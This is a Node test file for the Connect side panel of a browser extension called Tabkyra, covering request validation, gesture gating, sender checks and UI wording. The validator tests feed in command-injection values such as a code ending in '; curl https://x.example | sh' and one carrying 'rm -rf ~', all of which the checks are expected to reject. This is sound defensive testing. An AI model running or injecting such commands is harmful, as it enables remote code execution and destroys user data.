// The side panel's Connect pieces that don't need a browser: the relay's first check, the text
// helpers, and the header, tab and welcome wiring the UX review asked for.
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { dirname, join } from "node:path";
import { test } from "node:test";
import { fileURLToPath } from "node:url";
import { checkConnectRequest } from "../src/connect/check.ts";
import { connectorUrl, countdown, lastSeen, linkCommand } from "../src/connect/format.ts";
import { CONNECT_METHODS } from "../src/connect/types.ts";

const repo = join(dirname(fileURLToPath(import.meta.url)), "..");
const read = (f) => readFileSync(join(repo, f), "utf8");

test("the relay passes only known methods with object params, and names the id of a refused one", () => {
	assert.deepEqual([...CONNECT_METHODS], ["status", "approvalCode", "deviceCode", "setBusy", "joinHub", "setTheme"]);
	assert.deepEqual(checkConnectRequest({ id: 1, method: "status" }), { ok: true, request: { id: 1, method: "status" } });
	assert.deepEqual(checkConnectRequest({ id: 2, method: "setBusy", params: { busy: true } }).request.params, { busy: true });
	for (const bad of [{ id: 3, method: "link.off" }, { id: 3, method: "__proto__" }, { id: 3, method: 5 }, { id: 3, method: "status", params: [] }, { id: 3, method: "status", params: "x" }, { id: 3, method: "status", params: null }]) {
		const r = checkConnectRequest(bad);
		assert.equal(r.ok, false, JSON.stringify(bad));
		assert.equal(r.id, 3);
	}
	for (const bad of [null, undefined, "status", { method: "status" }, { id: "1", method: "status" }]) assert.equal(checkConnectRequest(bad).ok, false);
});

test("countdown and last-seen read as a person would say them", () => {
	assert.equal(countdown(10 * 60_000, 0), "10:00");
	assert.equal(countdown(9 * 60_000 + 41_000, 0), "9:41");
	assert.equal(countdown(65_000, 0), "1:05");
	assert.equal(countdown(1000, 1000), "");
	assert.equal(countdown(0, 5000), "");
	const now = Date.parse("2026-11-02T12:00:00Z");
	assert.equal(lastSeen(null, now), "never");
	assert.equal(lastSeen("garbage", now), "never");
	assert.equal(lastSeen("2026-11-02T11:59:30Z", now), "just now");
	assert.equal(lastSeen("2026-11-02T11:59:00Z", now), "1 minute ago");
	assert.equal(lastSeen("2026-11-02T11:55:00Z", now), "5 minutes ago");
	assert.equal(lastSeen("2026-11-02T09:00:00Z", now), "3 hours ago");
	assert.equal(lastSeen("2026-11-01T11:00:00Z", now), "1 day ago");
	assert.equal(connectorUrl("https://h.example.com"), "https://h.example.com/mcp");
	assert.equal(linkCommand("https://h.example.com", "TK-ABCD-EFGH"), "tabkyra link https://h.example.com --code TK-ABCD-EFGH");
});

test("Settings has the eight tabs in the spec's order, and Bridge is now Agents", () => {
	const panel = read("src/sidepanel.ts");
	const start = panel.indexOf("SettingsPage.open([");
	const list = panel.slice(start, panel.indexOf("]);\n", start));
	// Top-level entries only: a tab, or a combined tab by its name.
	const order = list
		.split("\n")
		.map((line) => /^\t\t(?:new CombinedTab\("(\w+)"|new (\w+)\(|(providers),)/.exec(line))
		.filter(Boolean)
		.map((m) => m[1] ?? m[2] ?? m[3]);
	assert.deepEqual(order, ["providers", "BridgeTab", "ConnectTab", "SkillsTab", "Privacy", "AppearanceTab", "CostsTab", "About"]);
	assert.match(read("src/dialogs/BridgeTab.ts"), /getTabName\(\): string \{\s*return "Agents";/);
	assert.match(read("src/dialogs/ConnectTab.ts"), /return "Connect";/);
	assert.match(read("src/dialogs/AppearanceTab.ts"), /return "Appearance";/);
});

test("the welcome dialog offers Connect, and Set up provider lands on the API keys list", () => {
	const welcome = read("src/dialogs/WelcomeSetupDialog.ts");
	assert.match(welcome, /Use from claude\.ai or ChatGPT/);
	assert.match(welcome, /Set up provider/);
	const panel = read("src/sidepanel.ts");
	assert.match(panel, /choice === "connect" \? \{ tab: "Connect" \} : \{ tab: "Providers", anchor: "api-keys-heading" \}/);
	assert.match(read("src/dialogs/ApiKeysTab.ts"), /id="api-keys-heading"/);
});

test("with no provider the composer's model button reads Add a provider", () => {
	const panel = read("src/sidepanel.ts");
	assert.match(panel, /if \(providerless\)\s+return \{ content: "Add a provider"/);
	assert.match(panel, /provider-key-saved", "provider-key-removed"/);
});

test("every icon-only header button has an aria-label and a visible tooltip", () => {
	const panel = read("src/sidepanel.ts");
	// headerButton sets both from one label.
	assert.match(panel, /function headerButton\([^)]*\)[\s\S]{0,200}aria-label=\$\{label\} data-tip=\$\{label\}/);
	for (const label of ["Past chats", "New chat", "Settings"]) assert.match(panel, new RegExp(`headerButton\\("${label}"`));
	// The More menu button carries both too.
	const menu = read("src/components/HeaderMenu.ts");
	assert.match(menu, /aria-label=\$\{this\.label\}\s+data-tip=\$\{this\.label\}/);
	assert.match(panel, /<tk-header-menu \.items=\$\{moreMenuItems\(\)\} label="More">/);
	// The recording pill and the Artifacts button too.
	assert.match(panel, /aria-label="Stop recording and save as a skill"\s+data-tip="Stop recording and save as a skill"/);
	// The theme items left the More menu; one Theme entry opens Appearance.
	assert.doesNotMatch(panel, /Light theme|Dark theme|Match the system/);
	assert.match(panel, /label: "Theme"[^}]*openApiKeysDialog\(\{ tab: "Appearance" \}\)/);
});

test("Privacy keeps one sentence visible and every long explanation under Details, text unchanged", () => {
	const text = read("src/dialogs/PrivacyTab.ts");
	assert.equal((text.match(/>Details</g) ?? []).length + (text.match(/<summary[^>]*>Details/g) ?? []).length >= 2, true);
	// The original explanations survive word for word.
	for (const kept of [
		"The side panel agent then runs only OpenRouter models, sent with zero data retention required and no",
		"Ollama cloud model) is still a cloud service: don't use one in private mode.",
		"Prefer names over IPs (for example mac.example.ts.net): a listed IP is trusted on every network, including one where it belongs to someone else.",
		"Keeps a copy of your side panel chats in ~/.local/share/tabkyra/threads (readable only by your user), so",
		"Nothing is sent: you review the report here, copy it, and paste it into a GitHub issue yourself.",
	]) {
		assert.ok(text.includes(kept), `missing: ${kept}`);
	}
});

test("Page scripts reads as one plain sentence with the old wording under Details", () => {
	const text = read("src/dialogs/BridgeTab.ts");
	assert.match(text, /Turning this on makes agents' page scripts run faster\./);
	assert.match(text, /Tabkyra has not been granted the userScripts permission\./);
	assert.match(text, /<summary class="cursor-pointer text-foreground">Details<\/summary>/);
	// The jargon is no longer a visible line.
	assert.doesNotMatch(text, /line\(\s*['"]Off: Tabkyra has not been granted/);
});

// ---------- round-1 review fixes ----------

test("a code reply is drawn only when the code is TK-XXXX-XXXX and the origin an origin", async () => {
	const { validApprovalCode, validDeviceCode } = await import("../src/connect/format.ts");
	const soon = Date.now() + 600_000;
	assert.equal(validApprovalCode({ code: "TK-ABCD-EFGH", expiresAt: soon, connectorUrl: "https://hub.example.com/mcp" }), true);
	assert.equal(validDeviceCode({ code: "TK-ABCD-EFGH", expiresAt: soon, hubUrl: "https://hub.example.com" }), true);
	assert.equal(validDeviceCode({ code: "TK-ABCD-EFGH", expiresAt: soon, hubUrl: "http://127.0.0.1:8787" }), true);
	for (const code of ["TK-ABCD-EFGH; curl https://x.example | sh", "TK-ABCD-EFGH\nrm -rf ~", "tk-abcd-efgh", "TK-ABCD", "", 5, undefined]) {
		assert.equal(validApprovalCode({ code, expiresAt: soon, connectorUrl: "https://hub.example.com/mcp" }), false, String(code));
		assert.equal(validDeviceCode({ code, expiresAt: soon, hubUrl: "https://hub.example.com" }), false, String(code));
	}
	for (const hubUrl of ["https://hub.example.com/x", "https://hub.example.com; id", "hub.example.com", "https://a b", "", undefined]) {
		assert.equal(validDeviceCode({ code: "TK-ABCD-EFGH", expiresAt: soon, hubUrl }), false, String(hubUrl));
	}
	for (const connectorUrl of ["https://hub.example.com", "https://hub.example.com/mcp?x", "https://hub.example.com/mcp; id", undefined]) {
		assert.equal(validApprovalCode({ code: "TK-ABCD-EFGH", expiresAt: soon, connectorUrl }), false, String(connectorUrl));
	}
	assert.equal(validApprovalCode({ code: "TK-ABCD-EFGH", expiresAt: "soon", connectorUrl: "https://hub.example.com/mcp" }), false);
	assert.equal(validApprovalCode(undefined), false);
	// The tab checks at mint and again before it draws a code box or the command that carries one.
	const tab = read("src/dialogs/ConnectTab.ts");
	assert.match(tab, /if \(!validApprovalCode\(made\)\) throw/);
	assert.match(tab, /if \(!validDeviceCode\(made\)\) throw/);
	assert.match(tab, /validApprovalCode\(this\.approval\) \? this\.codeBox/);
	assert.match(tab, /validDeviceCode\(this\.device\) \? this\.codeBox/);
	assert.match(tab, /validDeviceCode\(this\.device\) && countdown/);
});

test("Busy has its own error line that the status poll does not clear, and the switch follows the host", () => {
	const tab = read("src/dialogs/ConnectTab.ts");
	const load = /private async load\(\)[\s\S]*?\n\t\}\n/.exec(tab)[0];
	assert.doesNotMatch(load, /busyError/, "load() must not clear the busy error");
	const setBusy = /private async setBusy[\s\S]*?\n\t\}\n/.exec(tab)[0];
	assert.match(setBusy, /this\.busyError = err instanceof Error/);
	assert.doesNotMatch(setBusy, /this\.error =/);
	assert.match(tab, /\$\{this\.busyError \? html`<p[^>]*role="alert"/);
	assert.match(tab, /\.checked=\$\{live\(link\.busy\)\}/, "a refused toggle snaps back even when the value did not change");
});

test("the join form is hidden while the helper reports a config problem; loading, minting and joining reset in finally", () => {
	const tab = read("src/dialogs/ConnectTab.ts");
	assert.match(tab, /if \(s\.route !== "none" \|\| s\.problem\) return nothing;/);
	for (const name of ["load", "mint", "setBusy", "join"]) {
		const body = new RegExp(`private async ${name}\\([\\s\\S]*?\\n\\t\\}\\n`).exec(tab)[0];
		assert.match(body, /finally \{/, `${name} resets its flag in finally`);
	}
	assert.match(/private async join\(\)[\s\S]*?\n\t\}\n/.exec(tab)[0], /finally \{\s*this\.joining = undefined;/);
});

/** Stand in for the browser's record of a recent click. */
function activation(isActive) {
	Object.defineProperty(globalThis.navigator, "userActivation", { value: { isActive }, configurable: true });
}

/** A chrome.runtime.connect whose port records what is posted and lets the test answer. */
function fakePort() {
	const port = { posted: [], listener: undefined, onDisconnect: undefined };
	globalThis.chrome = {
		runtime: {
			connect: () => ({
				postMessage: (m) => port.posted.push(m),
				onMessage: { addListener: (f) => (port.listener = f) },
				onDisconnect: { addListener: (f) => (port.onDisconnect = f) },
			}),
		},
	};
	return port;
}

test("a request the helper never answers fails with no_reply after 20 s (30 s for joinHub), and an answer cancels the timer", async (t) => {
	t.mock.timers.enable({ apis: ["setTimeout"] });
	const port = fakePort();
	activation(true);
	const client = await import("../src/connect/client.ts?timeout");
	assert.equal(client.REQUEST_TIMEOUT_MS, 20_000);
	assert.equal(client.JOIN_TIMEOUT_MS, 30_000);

	const status = client.connectStatus().catch((e) => e);
	t.mock.timers.tick(19_999);
	assert.equal(port.posted.length, 1);
	t.mock.timers.tick(1);
	const err = await status;
	assert.ok(err instanceof client.ConnectRequestError);
	assert.equal(err.code, "no_reply");
	assert.equal(err.message, "Tabkyra's helper didn't answer. Update it: tabkyra update");
	assert.equal(client.isNoHost(err), false);
	// A late answer for the forgotten request is ignored.
	port.listener({ id: port.posted[0].id, result: { route: "none" } });

	// joinHub gets 30 s, and progress from the helper restarts the wait.
	const steps = [];
	const join = client.connectJoinHub("https://hub.example.com", "TK-ABCD-EFGH", undefined, (s) => steps.push(s)).catch((e) => e);
	const joinId = port.posted.at(-1).id;
	t.mock.timers.tick(29_999);
	port.listener({ id: joinId, progress: { step: "service" } });
	t.mock.timers.tick(29_999);
	assert.deepEqual(steps, ["service"]);
	port.listener({ id: joinId, result: { name: "laptop", manage: false } });
	assert.deepEqual(await join, { name: "laptop", manage: false });
	t.mock.timers.tick(120_000); // nothing left to expire

	// An answer in time resolves and leaves no timer behind; a lost port rejects what is waiting.
	const ok = client.connectStatus();
	port.listener({ id: port.posted.at(-1).id, result: { route: "none" } });
	assert.deepEqual(await ok, { route: "none" });
	const lost = client.connectApprovalCode().catch((e) => e);
	port.onDisconnect();
	assert.equal((await lost).code, "no_host");
	t.mock.timers.tick(120_000);
});

test("the relay forgets a request the host never answers, and clears the timer when it is answered or the panel leaves", () => {
	const relay = read("src/connect/relay.ts");
	assert.match(relay, /export const RELAY_WAIT_MS = 60_000;/);
	assert.match(relay, /const forget = \(hostId: number\)[\s\S]*?clearTimeout\(waiting\.get\(hostId\)\?\.timer\);\s*waiting\.delete\(hostId\);/);
	assert.match(relay, /if \(message\.error \|\| reply\.result !== undefined\) forget\(message\.id\);/);
	assert.match(relay, /if \(w\.port === port\) forget\(hostId\);/);
});

test("a hub at http://[::1]:port passes the panel's shape checks, as it does the host's", async () => {
	const { validApprovalCode, validDeviceCode } = await import("../src/connect/format.ts");
	const soon = Date.now() + 600_000;
	assert.equal(validDeviceCode({ code: "TK-ABCD-EFGH", expiresAt: soon, hubUrl: "http://[::1]:8787" }), true);
	assert.equal(validApprovalCode({ code: "TK-ABCD-EFGH", expiresAt: soon, connectorUrl: "http://[::1]:8787/mcp" }), true);
	for (const hubUrl of ["http://[::2]:8787", "http://[::1", "http://[::1]x", "http://[::1]/x"]) assert.equal(validDeviceCode({ code: "TK-ABCD-EFGH", expiresAt: soon, hubUrl }), false, hubUrl);
});

test("Join a hub asks for a Device code from Add a device, takes an optional name, and tells a silent helper after the link step", () => {
	const tab = read("src/dialogs/ConnectTab.ts");
	assert.match(tab, /a device code from Settings › Connect › Your devices › Add a device on the hub \(or a manager device\)/);
	assert.match(tab, /<span>Device code<\/span>/);
	assert.doesNotMatch(tab, /<span>Connect code<\/span>/);
	assert.match(tab, /<span>Device name \(optional\)<\/span>/);
	assert.match(tab, /this\.joinName\.trim\(\) \|\| undefined/);
	assert.match(tab, /Tabkyra may have linked this device\. Reopen Settings to check\./);
	assert.match(tab, /linkWritten && err instanceof ConnectRequestError && err\.code === "no_reply"/);
});

test("checkConnectRequest refuses a method that is not a string without coercing it", () => {
	for (const method of [{ toString: 0 }, { toString: "x" }, 5, null, ["status"]]) {
		const out = checkConnectRequest({ id: 4, method });
		assert.equal(out.ok, false);
		assert.equal(out.id, 4);
	}
	assert.equal(checkConnectRequest({ id: 4, method: "status" }).ok, true);
});

// ---------- round 2 review fixes ----------

const ORIGIN = "chrome-extension://abcdefghijklmnopabcdefghijklmnop/";

test("first-F1: the relay serves only the side panel document, never a tab, another page or a content script", async () => {
	const { isSidePanelPort } = await import("../src/connect/gate.ts");
	const panel = `${ORIGIN}sidepanel.html`;
	assert.equal(isSidePanelPort({ url: panel }, ORIGIN), true);
	assert.equal(isSidePanelPort({ url: panel, origin: ORIGIN.slice(0, -1) }, ORIGIN), true);
	assert.equal(isSidePanelPort({ url: `${panel}?x=1#y` }, ORIGIN), true);
	// The panel opened as a tab: a browser-driving client can reach that.
	assert.equal(isSidePanelPort({ url: panel, tab: { id: 7 } }, ORIGIN), false, "a tab-hosted panel was served");
	// Other extension pages, a content script, a look-alike, nothing.
	for (const url of [`${ORIGIN}options.html`, `${ORIGIN}sidepanel.html/x`, `${ORIGIN}x/sidepanel.html`, "https://evil.example/sidepanel.html", "chrome-extension://zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz/sidepanel.html", undefined, "not a url"]) {
		assert.equal(isSidePanelPort({ url }, ORIGIN), false, String(url));
	}
	assert.equal(isSidePanelPort({ url: panel, origin: "https://evil.example" }, ORIGIN), false);
	assert.equal(isSidePanelPort(undefined, ORIGIN), false);
});

test("first-F1: approvalCode, deviceCode and joinHub need a fresh, unused gesture token; the others do not", async () => {
	const { GestureGate } = await import("../src/connect/gate.ts");
	let now = 1_000_000;
	const gate = new GestureGate(() => now);
	for (const method of ["approvalCode", "deviceCode", "joinHub"]) {
		assert.equal(gate.allows(method, undefined), false, `${method} without a gesture`);
		assert.equal(gate.allows(method, { token: `t-${method}`, at: now }), true, `${method} with one`);
		assert.equal(gate.allows(method, { token: `t-${method}`, at: now }), false, `${method}: a token works once`);
	}
	assert.equal(gate.allows("approvalCode", { token: "old", at: now - 5_001 }), false, "stale");
	assert.equal(gate.allows("approvalCode", { token: "edge", at: now - 5_000 }), true);
	assert.equal(gate.allows("approvalCode", { token: "future", at: now + 5_000 }), false, "from the future");
	for (const method of ["status", "setBusy", "setTheme"]) assert.equal(gate.allows(method, undefined), true, method);
	// The same token can be reused after it has aged out of the gate's memory only if it is also too old to pass.
	now += 60_000;
	assert.equal(gate.allows("joinHub", { token: "t-joinHub", at: now - 59_000 }), false);
	// check.ts carries a well-formed gesture and refuses a malformed one.
	const { checkConnectRequest } = await import("../src/connect/check.ts");
	assert.deepEqual(checkConnectRequest({ id: 1, method: "joinHub", gesture: { token: "a", at: 5 } }).request.gesture, { token: "a", at: 5 });
	for (const gesture of [null, "x", { token: 5, at: 1 }, { token: "a" }, { token: "a", at: "1" }, { token: "x".repeat(65), at: 1 }]) assert.equal(checkConnectRequest({ id: 1, method: "joinHub", gesture }).ok, false, JSON.stringify(gesture));
});

test("first-F1: the real relay refuses a tab-hosted panel and a missing gesture, and never forwards the gesture to the host", async (t) => {
	const { installFakeChrome } = await import("./fake-chrome.mjs");
	const priorChrome = globalThis.chrome;
	installFakeChrome();
	t.after(() => {
		globalThis.chrome = priorChrome;
	});
	let onConnect;
	chrome.runtime.getURL = () => ORIGIN;
	chrome.runtime.onConnect = { addListener: (f) => (onConnect = f) };
	const relay = await import("../src/connect/relay.ts");
	// A connected native port that records what the relay sends to the host.
	const native = await import("../src/bridge/native.ts");
	// The bridge and the relay arm timers that outlive this test (the bridge has no stop). Track every timer and
	// interval made while it runs and clear them all at the end, so none fires after the test has ended.
	const realSetTimeout = globalThis.setTimeout;
	const realSetInterval = globalThis.setInterval;
	const timers = [];
	const intervals = [];
	globalThis.setTimeout = (fn, ms, ...rest) => {
		const h = realSetTimeout(fn, ms, ...rest);
		timers.push(h);
		return h;
	};
	globalThis.setInterval = (fn, ms, ...rest) => {
		const h = realSetInterval(fn, ms, ...rest);
		intervals.push(h);
		return h;
	};
	t.after(() => {
		globalThis.setTimeout = realSetTimeout;
		globalThis.setInterval = realSetInterval;
		for (const h of timers) clearTimeout(h);
		for (const h of intervals) clearInterval(h);
	});
	let hostPort;
	const realConnectNative = chrome.runtime.connectNative;
	chrome.runtime.connectNative = (...args) => (hostPort = realConnectNative.apply(chrome.runtime, args));
	// The bridge has no stop: its timers are cleared above, and the fake host port is detached at the end.
	t.after(() => {
		chrome.runtime.connectNative = realConnectNative;
		hostPort?.onMessage.listeners.splice(0);
		hostPort?.onDisconnect.listeners.splice(0);
	});
	native.startBridge();
	assert.ok(hostPort, "the native port did not connect");
	const sent = { get length() { return hostPort.sent.filter((m) => m.type === "connect").length; }, frames: () => hostPort.sent.filter((m) => m.type === "connect") };
	relay.startConnectRelay();
	assert.equal(typeof onConnect, "function");
	const mkPort = (sender) => {
		const port = { name: "tabkyra-connect", sender, replies: [], disconnected: false, listener: undefined };
		port.postMessage = (m) => port.replies.push(m);
		port.disconnect = () => (port.disconnected = true);
		port.onMessage = { addListener: (f) => (port.listener = f) };
		port.onDisconnect = { addListener() {} };
		return port;
	};
	const tabPort = mkPort({ url: `${ORIGIN}sidepanel.html`, tab: { id: 3 } });
	onConnect(tabPort);
	assert.equal(tabPort.disconnected, true, "a tab-hosted panel kept its port");
	assert.equal(tabPort.listener, undefined);

	const panelPort = mkPort({ url: `${ORIGIN}sidepanel.html` });
	onConnect(panelPort);
	assert.equal(panelPort.disconnected, false);
	panelPort.listener({ id: 1, method: "approvalCode" });
	assert.equal(panelPort.replies[0].error.code, "no_gesture");
	assert.equal(sent.length, 0, "a code request without a gesture reached the host");
	// A fabricated token, a spent one, a stale one: none of them reaches the host.
	// Past the gate the request goes on to the host, and the recorded frame shows it.
	panelPort.listener({ id: 2, method: "status" });
	assert.equal(sent.length, 1, "a status request did not reach the host");
	assert.equal(sent.frames()[0].method, "status");
	panelPort.listener({ id: 3, method: "approvalCode", gesture: { token: "once", at: Date.now() } });
	assert.equal(sent.length, 2);
	assert.equal(sent.frames()[1].method, "approvalCode");
	assert.equal(sent.frames()[1].gesture, undefined, "the gesture went on to the host");
	panelPort.listener({ id: 4, method: "approvalCode", gesture: { token: "once", at: Date.now() } });
	assert.equal(panelPort.replies.at(-1).error.code, "no_gesture", "a spent token worked twice");
	panelPort.listener({ id: 5, method: "joinHub", params: { hubUrl: "https://h.example.com", code: "TK-ABCD-EFGH" }, gesture: { token: "stale", at: Date.now() - 60_000 } });
	assert.equal(panelPort.replies.at(-1).error.code, "no_gesture");
	assert.equal(sent.length, 2, "a refused request reached the host");
	// The frame the relay builds names its fields; the gesture is not among them.
	assert.doesNotMatch(/sendConnect\(\{[\s\S]*?\}\)/.exec(read("src/connect/relay.ts"))[0], /gesture/);
});

test("first-F1: the panel's client mints a gesture only while the click is live, and the relay's check has no test allowance", async () => {
	const port = fakePort();
	const client = await import("../src/connect/client.ts?gesture");
	activation(false);
	const refused = await client.connectApprovalCode().catch((e) => e);
	assert.equal(refused.code, "no_gesture");
	assert.equal(port.posted.length, 0, "a request left the panel without a click");
	assert.equal((await client.connectJoinHub("https://h.example.com", "TK-ABCD-EFGH", undefined, () => {}).catch((e) => e)).code, "no_gesture");
	activation(true);
	void client.connectApprovalCode().catch(() => {});
	assert.equal(port.posted.at(-1).method, "approvalCode");
	assert.match(port.posted.at(-1).gesture.token, /^[0-9a-f-]{36}$/);
	assert.ok(Math.abs(port.posted.at(-1).gesture.at - Date.now()) < 1000);
	void client.connectStatus().catch(() => {});
	assert.equal(port.posted.at(-1).gesture, undefined, "status needs no gesture");
	// Release builds carry no way around the check: the relay's decision is the gate's, with no flag.
	const relay = read("src/connect/relay.ts");
	const gate = read("src/connect/gate.ts");
	assert.match(relay, /if \(!isSidePanelPort\(port\.sender, origin\)\)/);
	for (const text of [relay, gate]) assert.doesNotMatch(text.replace(/\/\*[\s\S]*?\*\//g, ""), /TEST|process\.env|__TABKYRA|allowTab|globalThis/i);
});

test("first-F1: the bridge never opens Tabkyra's own pages, in any permission mode, and never asks the user about them", async () => {
	const { installFakeChrome } = await import("./fake-chrome.mjs");
	const fake = installFakeChrome?.();
	void fake;
	chrome.runtime.id = "abcdefghijklmnopabcdefghijklmnop";
	const perms = await import("../src/bridge/permissions.ts?own");
	const own = `chrome-extension://${chrome.runtime.id}/sidepanel.html`;
	assert.equal(perms.isOwnExtensionUrl(own), true);
	assert.equal(perms.isOwnExtensionUrl(`chrome-extension://${chrome.runtime.id.toUpperCase()}/`), true);
	assert.equal(perms.isOwnExtensionUrl("chrome-extension://someotherextensionid/"), false);
	assert.equal(perms.isOwnExtensionUrl(`blob:chrome-extension://${chrome.runtime.id}/6f1c0c3e-2f4b-4a53-9d40-0e1f9f3a7b11`), true);
	assert.equal(perms.isOwnExtensionUrl(`filesystem:chrome-extension://${chrome.runtime.id}/temporary/x.html`), true);
	assert.equal(perms.isOwnExtensionUrl("blob:https://example.com/6f1c0c3e-2f4b-4a53-9d40-0e1f9f3a7b11"), false);
	assert.equal(perms.isOwnExtensionUrl("filesystem:https://example.com/temporary/x.html"), false);
	assert.equal(perms.isOwnExtensionUrl("https://example.com/"), false);
	assert.equal(perms.isOwnExtensionUrl("not a url"), false);
	await perms.setPermissionMode("allow_all");
	assert.equal(await perms.isUrlAllowed(`blob:chrome-extension://${chrome.runtime.id}/6f1c0c3e-2f4b-4a53-9d40-0e1f9f3a7b11`), false);
	assert.equal(await perms.isUrlAllowed("https://example.com/"), true);
	assert.equal(await perms.isUrlAllowed(own), false, "allow_all opened the extension's own page");
	await perms.setPermissionMode("ask");
	await perms.allowHost(chrome.runtime.id);
	assert.equal(await perms.isUrlAllowed(own), false, "an allowed host named like the extension id opened its page");
	// native.ts checks before it asks the user, and says why.
	const native = read("src/bridge/native.ts");
	assert.match(native, /async function askPermission\([^)]*\): Promise<boolean> \{\s*if \(isOwnExtensionUrl\(url\)\) return false;/);
	assert.match(native, /isOwnExtensionUrl\(url\)\s*\? "Not allowed to open Tabkyra's own pages\."/);
});

test("first-F2: joining shows the hub's host, the warning and the scopes, and sends nothing until Confirm; success lists the scopes", () => {
	const tab = read("src/dialogs/ConnectTab.ts");
	const format = read("src/connect/format.ts");
	assert.match(format, /export const JOIN_WARNING =\s*"The hub's owner will be able to open sites, read pages, and click and type in this browser as you\.";/);
	assert.match(tab, /\$\{JOIN_WARNING\}/);
	assert.match(tab, /Join \$\{this\.confirming\.host\}\?/);
	assert.match(tab, /This device will allow:[\s\S]*?this\.confirming\.scopes\.map\(\(x\) => html`<li>\$\{x\.what\}<\/li>`\)/);
	assert.doesNotMatch(tab, /the hub's default list/);
	// The Join hub button asks; only Confirm calls join().
	assert.match(tab, /children: "Join hub",[\s\S]*?onClick: \(\) => this\.askJoin\(s\)/);
	assert.match(tab, /children: "Confirm", onClick: \(\) => void this\.join\(\)/);
	assert.doesNotMatch(tab, /children: "Join hub",[\s\S]{0,80}void this\.join\(\)/);
	// What was confirmed is what is sent.
	assert.match(/private async join\(\)[\s\S]*?\n\t\}\n/.exec(tab)[0], /connectJoinHub\(\s*confirmed\.hubUrl,\s*confirmed\.code,\s*confirmed\.name,/);
	assert.match(tab, /The hub may use this browser for: \$\{allowed\}/);
});

test("hubHost names the host as typed, a pasted connector URL included", async () => {
	const { hubHost } = await import("../src/connect/format.ts");
	assert.equal(hubHost("https://hub.example.com"), "hub.example.com");
	assert.equal(hubHost(" https://hub.example.com/mcp "), "hub.example.com");
	assert.equal(hubHost("hub.example.com"), "hub.example.com");
	assert.equal(hubHost("http://127.0.0.1:8787"), "127.0.0.1:8787");
	assert.equal(hubHost(""), undefined);
	assert.equal(hubHost("https://"), undefined);
	assert.equal(hubHost("a b"), undefined);
});

test("sol-F4: join progress and the outcome render outside the join form, and a service failure says to run tabkyra link status", () => {
	const tab = read("src/dialogs/ConnectTab.ts");
	const form = /private joinForm\([\s\S]*?\n\t\}\n/.exec(tab)[0];
	assert.doesNotMatch(form, /joinMessage|this\.joining\b[^)]*role="status"/, "the message is still drawn inside the form that the route change removes");
	assert.match(/private joinNotice\(\)[\s\S]*?\n\t\}\n/.exec(tab)[0], /this\.joinMessage/);
	assert.match(/render\(\): TemplateResult[\s\S]*$/.exec(tab)[0], /\$\{this\.joinNotice\(\)\}[\s\S]*\$\{this\.assistants\(s\)\}/);
});

test("second-S2: on the link route the connector URL is the hub's own, shown once a code exists", () => {
	const tab = read("src/dialogs/ConnectTab.ts");
	assert.match(tab, /s\.route === "link"\s*\?\s*validApprovalCode\(this\.approval\)\s*\?\s*this\.command\("Connector URL", this\.approval\.connectorUrl\)/);
	assert.match(tab, /Get a code to see the connector URL\./);
});

test("first-F3/second-G2: a helper that lists no scopes in {id, what} form gets no Confirm; the confirm lists descriptions, never 'the hub's choice'", async () => {
	const { joinScopesOf, HELPER_OUT_OF_DATE } = await import("../src/connect/format.ts");
	assert.equal(HELPER_OUT_OF_DATE, "Tabkyra's helper is out of date. Run tabkyra update, then try again.");
	const rows = [{ id: "browser.read", what: "See the agent's own tabs and read pages" }];
	assert.deepEqual(joinScopesOf({ joinScopes: rows }), rows);
	for (const bad of [undefined, [], ["browser.read"], [{ id: "a" }], [{ id: "", what: "x" }], [rows[0], null], "browser.read"]) assert.equal(joinScopesOf({ joinScopes: bad }), undefined, JSON.stringify(bad));
	const tab = read("src/dialogs/ConnectTab.ts");
	assert.match(/private askJoin\([\s\S]*?\n\t\}\n/.exec(tab)[0], /const scopes = joinScopesOf\(s\);\s*if \(!scopes\) \{\s*this\.joinMessage = \{ ok: false, text: HELPER_OUT_OF_DATE \};\s*return;/);
	assert.doesNotMatch(tab, /joinScopes \?\? \[\]/);
});

test("second-G3: a confirm is dropped when a route or problem appears, and when the address, code or name is edited", () => {
	const tab = read("src/dialogs/ConnectTab.ts");
	assert.match(/private async load\(\)[\s\S]*?\n\t\}\n/.exec(tab)[0], /this\.status = await connectStatus\(\);[\s\S]*?if \(this\.status\.route !== "none" \|\| this\.status\.problem\) this\.confirming = undefined;/);
	for (const field of ["hubUrl", "joinCode", "joinName"]) assert.match(tab, new RegExp(`this\\.${field} = \\(e\\.target as HTMLInputElement\\)\\.value;\\s*this\\.confirming = undefined;`), field);
});
